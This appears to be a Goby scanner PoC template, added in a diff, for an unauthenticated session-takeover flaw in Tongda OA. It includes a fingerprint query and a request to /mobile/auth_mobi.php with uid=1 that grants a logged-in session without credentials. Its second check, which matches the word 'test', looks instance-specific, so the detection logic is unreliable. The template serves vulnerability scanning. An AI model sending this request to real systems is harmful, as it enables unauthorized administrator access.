@@ -1,0 +1,83 @@
+{
+      "Name": "通达oa未授权访问",
+      "Level": "2",
+      "Tags": [],
+      "GobyQuery": "app=\"TDXK-通达OA\" || body=\"通达oa\" || body=\"tongda2000\" || body=\"Office Anywhere\" || body=\"tongda\" ||product=\"TongDa-OA\"",
+      "Description": "通达oa未授权访问",
+      "Product": "通达oa",
+      "Homepage": "",
+      "Author": "",
+      "Impact": "",
+      "Recommandation": "<p>undefined</p>",
+      "References": [
+            "https://www.freebuf.com/vuls/265749.html",
+            "https://mp.weixin.qq.com/s/IabOKaeNyAsh8V4k2cmXAw"
+      ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "not contains",
+                                    "value": "relogin",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/general/",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "test",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "2021-04-02 12:09:45",
+      "GobyVersion": "1.8.255"
+}
